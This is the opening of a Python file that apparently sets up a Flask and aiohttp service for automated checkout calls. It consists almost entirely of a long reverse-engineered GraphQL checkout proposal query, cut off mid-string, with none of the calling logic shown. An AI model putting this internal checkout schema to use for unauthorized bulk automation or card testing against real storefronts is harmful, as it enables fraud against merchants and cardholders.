import asyncio
import aiohttp
import json
import re
import random
import uuid
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import time
import threading
import string


# ============================================================
#  KEEP YOUR EXISTING QUERY STRINGS HERE — UNCHANGED
#  Paste your current QUERY_PROPOSAL_SHIPPING, MUTATION_SUBMIT,
#  and QUERY_POLL exactly as they are in your working file.
# ============================================================

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on 